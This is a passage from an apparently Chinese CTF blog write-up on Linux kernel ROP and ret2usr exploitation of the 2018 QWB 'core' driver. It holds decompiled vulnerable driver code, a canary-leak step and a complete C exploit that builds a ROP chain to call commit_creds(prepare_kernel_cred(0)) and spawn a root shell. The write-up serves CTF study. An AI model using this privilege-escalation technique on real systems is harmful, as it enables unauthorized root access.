class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h4><p>kernel 有个两个函数可以改变进程的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int commit_creds(struct cred *new)</span><br><span class="line">struct cred* prepare_kernel_cred(struct task_struct* daemon)</span><br><span class="line">执行commit_creds(prepare_kernel_cred(0))就可以获得uid，gid=0的权限</span><br><span class="line">可以在/proc/kallsyms中查看</span><br><span class="line">也可以利用thread_info中cred和read_cred 修改cred</span><br></pre></td></tr></table></figure><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><h4 id="mep"><a href="#mep" class="headerlink" title="mep"></a>mep</h4><p>Supervisor Mode Execution Protection，当处理器处于 ring0 模式时，执行 用户空间 的代码会触发页错误。（在 arm 中该保护称为 PXN)</p><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p> Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时</p><h3 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h3><p>linux kernel  rop 和 user spces 的rop 其实大同小异，只是多了几个步骤。<br>而linux kernel  re2usr 则是 从kernel 返回到用户控制执行user spces的代码<br>一般导致这两个漏洞产生的原因都是越界访问后面的内存，就是溢出<br>拿2018年强网杯的 core 来做分析</p><h4 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h4><p>有四个文件<br><code>bzImage core.cpio start.sh vmlinux</code><br>先看看 start.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>发现开了 kaslr<br>再解压 core.cpio 看看init</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>发现把 kallsyms保存到tmp，虽然不可以读/proc/kallsyms 但是可以读tmp目录下的<br>挂载了 core.ko<br>那么就来分析 下core.ko 这题的突破口应该就是这个驱动程序<br>这个程序注册了7个函数，并且开了 Canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">core_release core_write core_read core_copy_func</span><br><span class="line">core_ioctl init_moddule exit_core</span><br><span class="line">└─[2] &lt;&gt; checksec core.ko </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><h5 id="core-ioctl"><a href="#core-ioctl" class="headerlink" title="core_ioctl"></a>core_ioctl</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3); <span class="comment">//读</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3; <span class="comment">// 设置 off</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);写</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="keyword">char</span> *)&amp;v5 + off, <span class="number">64L</span>L); <span class="comment">//这里的off并没有约束，而且可控</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h5 id="core-write"><a href="#core-write" class="headerlink" title="core_write"></a>core_write</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, v3) )<span class="comment">//a2 v3 没有约束，而且可控</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析到这里我们们就可以大概想到如何提取<br>既然开了canary 而且读的时候 offset可以控，那么首先控制offset指向canary，然后读出来，再写rop<br>那么写个测试程序来测试下canary的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffffc03190ba &lt;core_read+87&gt;     mov    rsi, rsp -&gt;v5</span><br><span class="line"> ► 0xffffffffc03190bd &lt;core_read+90&gt;     add    rsi, qword ptr [rip + 0x2b3c]//offset</span><br><span class="line">   0xffffffffc03190c4 &lt;core_read+97&gt;     mov    edx, 0x40</span><br><span class="line">   0xffffffffc03190c9 &lt;core_read+102&gt;    mov    rdi, rbx</span><br><span class="line">   0xffffffffc03190cc &lt;core_read+105&gt;    call   0xffffffffa9926f10</span><br><span class="line">00:0000│ rax rdi rsi rsp  0xffffb526c00d3e18 ◂— &apos;Welcome to the QWB CTF challenge.\n&apos;</span><br><span class="line">01:0008│                  0xffffb526c00d3e20 ◂— &apos;to the QWB CTF challenge.\n&apos;</span><br><span class="line">02:0010│                  0xffffb526c00d3e28 ◂— &apos;WB CTF challenge.\n&apos;</span><br><span class="line">03:0018│                  0xffffb526c00d3e30 ◂— &apos;hallenge.\n&apos;</span><br><span class="line">04:0020│ rdx-3            0xffffb526c00d3e38 ◂— 0xa2e /* &apos;.\n&apos; */</span><br><span class="line">05:0028│                  0xffffb526c00d3e40 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0040│                  0xffffb526c00d3e58 ◂— 0xb96743b5aa598100  //canary</span><br><span class="line">偏移就是0x40,</span><br><span class="line">测出偏移就可以读出canary</span><br></pre></td></tr></table></figure><p>ROP exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_READ  0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_SET   0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags,user_sp;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"popq %3\n"</span></span><br><span class="line">    : <span class="string">"=r"</span> (user_cs), <span class="string">"=r"</span> (user_ss),<span class="string">"=r"</span>(user_sp),<span class="string">"=r"</span> (user_rflags) : : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()&#123;</span><br><span class="line">    FILE * fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open /proc/core error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,CORE_SET, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,CORE_READ, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b1_&gt;0x%lx\n"</span>,<span class="number">0xffffffff81a012da</span> + offset);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    </span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;         <span class="comment">// rip </span></span><br><span class="line">    </span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd,CORE_WRITE, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>re2usr exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 